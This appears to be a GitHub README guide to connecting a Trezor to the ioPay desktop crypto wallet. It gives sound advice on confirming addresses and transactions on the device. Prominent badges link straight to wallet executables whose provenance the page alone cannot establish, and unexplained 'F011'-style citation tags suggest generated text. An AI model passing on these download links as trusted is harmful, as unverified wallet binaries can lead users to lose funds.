![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Connecting a Trezor to ioPay Wallet

**Trezor support exists in this build.** The repository's signer providers include Ledger, Trezor and WalletConnect (F011), so the flow is: device connected by USB, account added through the hardware path, address confirmed **on the device**.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

This page describes that flow and is deliberately silent on two things people ask for: which Trezor models are supported, and which firmware versions work. Neither is published, and inventing a list would be worse than saying so.

## Before you connect

- The Trezor set up, with its recovery phrase stored safely - a hardware wallet's phrase is a **different** phrase from any software wallet's.
- The current desktop build - v2.0.2, 19 November 2026.
- A data-capable USB cable, directly connected where possible.
- Your software accounts backed up independently; hardware covers the accounts on the device, not the rest.

## Connect

1. **Connect and unlock the device.**
2. **Add the account** in the wallet through the hardware path (F011).
3. **Confirm the address on the device screen** (F028). Read it on the device, not the monitor.
4. **Note both formats** in the app - `io1...` and `0x...` for the same account (F019). The device protects one key; the app shows both encodings.

## Ledger and Trezor are not the same route

Worth stating, because the two names get used interchangeably in guides:

- **Ledger** signs IOTX through an **IoTeX app installed on the device** (F035).
- **Trezor** is supported through the **wallet's provider layer** (F011) - a different integration, not the same app model.

So a guide written for Ledger's on-device app does not transfer step-for-step to Trezor, and a device prompt that appears on one may not appear on the other.

## What the hardware protects, and what it does not

**Protects:** the key, and therefore any signing you do not confirm on the device screen. A compromised computer can propose a transaction but cannot approve it.

**Does not protect:** against a malicious transaction you *do* confirm, a phishing site whose address you paste, or losing the device without its recovery phrase. The device moves the trust boundary; it does not remove the human one.

## If it does not work

**The wallet does not detect the device.** Cable, port, unlock state, and whether the device is waiting for a host app. Try a direct port before a hub.

**The device shows a different address.** Stop. A mismatch between device and screen is the one signal to treat as hostile - reconnect and confirm which account is being displayed.

**Signing fails.** Read the device prompt; some operations ask for confirmation on the device that the app's screen does not mention.

**Linux USB permissions.** On some distributions, the desktop user needs a udev rule to access the device. That is an OS configuration, not a wallet setting.

## Related

- [Connecting a Ledger](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/connecting-a-ledger-device-to-iopay-wallet.md) - the other hardware route, and why it differs.
- [Backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md) - a hardware phrase is a separate phrase.
- [io1 and 0x addresses](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md) - the two forms the device and app display.

## FAQ

**Does Trezor work with IoTeX and ioPay?**
Yes - Trezor support is present in the build's signer providers (F011). This page does not list supported models or firmware, because none is published.

**Which Trezor models are supported?**
Not stated anywhere this project publishes. The honest answer is to try your device and confirm the address on it.

**Can I stake with a Trezor?**
Staking is a signed transaction, so it goes through the same hardware path as any other action; the wallet builds it and the device confirms.

**Can I move a Trezor account into a software wallet?**
No. There is no key to export; use the device with another compatible wallet instead.

**Is hardware signing worth it?**
For balances you would not want to lose, yes: it removes key theft by malware as a realistic risk. It does not remove approval phishing.

## Why this page has no model list

Trezor ships several devices with different screens, buttons and firmware tracks, and this project publishes nothing that maps them onto this build. A list invented here would be the most useful paragraph on the page and the least true one, so the page describes the flow instead: USB connection, hardware path, confirmation on the device.

The practical consequence is that your device is the specification. If it completes the flow, it works; if the prompt on the device does not match what the app is asking for, that mismatch is the information you needed, and it is not something a compatibility table would have told you.

## Reading the device prompt

A hardware signer's value is that it shows you what you are authorising, in its own words, on its own screen. Three things are worth reading there every time:

**The address**, not the label the app shows. A malicious or compromised app can display any label it likes.

**The amount and the asset**, as the device renders them. If the device says a different amount from the screen behind it, stop - that is the attack the device exists to reveal.

**Whether the prompt is a signature at all.** A "connect" or "unlock" prompt is not an authorisation; a signature prompt is, and it should be for the action you initiated.

If a prompt appears that you did not start, reject it. The device will not sign anything you do not confirm, which is exactly why confirming carelessly wastes the protection you paid for.

## Keeping the two sides in step

Device firmware and the desktop wallet are updated from different places by different people, and a working setup can fail simply because one moved. If signing stops working after an update to either side, bring the other current before changing cables or reinstalling.


---

*Signer providers follow the repository tree (F011); address formats and confirmation behaviour follow IoTeX documentation and F028/F019.*
